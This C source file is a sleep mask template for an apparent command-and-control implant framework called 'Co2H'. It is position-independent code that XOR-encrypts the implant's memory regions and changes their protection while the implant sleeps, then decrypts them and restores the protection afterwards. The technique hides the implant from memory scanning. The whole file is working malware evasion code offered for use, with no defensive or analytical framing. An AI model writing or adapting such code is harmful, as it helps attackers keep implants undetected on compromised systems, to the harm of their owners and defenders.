// test.mask -- Co2H sleep mask template.
//
// Position-independent code (PIC): no globals, no string literals,
// no CRT. Use only function pointers from SleepMaskCtx.
// Entry point MUST be at offset 0 of .text (define helpers AFTER).

#include "../../sleep_mask_api.h"

// ---- ENTRY POINT (must be first defined function) -------------------------

void __cdecl sleep_mask_entry(SleepMaskCtx* ctx) {
    uint32_t i;
    SIZE_T   sz;
    PVOID    base;
    ULONG    old_prot;

    // 1. Encrypt regions (XOR with ctx->key) and mark PAGE_READWRITE.
    for (i = 0; i < ctx->region_count; i++) {
        base = ctx->regions[i].base;
        sz   = ctx->regions[i].size;
        ctx->NtProtectVirtualMemory(ctx->process_handle, &base, &sz,
                                    /*PAGE_READWRITE*/ 0x04, &old_prot);

        // XOR with 16-byte key
        uint8_t* p = (uint8_t*)ctx->regions[i].base;
        for (uint32_t j = 0; j < ctx->regions[i].size; j++)
            p[j] ^= ctx->key[j & 15];
    }

    // 2. Sleep.
    LARGE_INTEGER delay;
    delay.QuadPart = -((LONGLONG)ctx->sleep_ms * 10000); // 100-ns units, negative = relative
    ctx->NtDelayExecution(FALSE, &delay);

    // 3. Decrypt and restore original protection.
    for (i = 0; i < ctx->region_count; i++) {
        uint8_t* p = (uint8_t*)ctx->regions[i].base;
        for (uint32_t j = 0; j < ctx->regions[i].size; j++)
            p[j] ^= ctx->key[j & 15];

        base = ctx->regions[i].base;
        sz   = ctx->regions[i].size;
        ctx->NtProtectVirtualMemory(ctx->process_handle, &base, &sz,
                                    ctx->regions[i].original_prot, &old_prot);
        ctx->FlushInstructionCache(ctx->process_handle,
                                   ctx->regions[i].base,
                                   ctx->regions[i].size);
    }
}
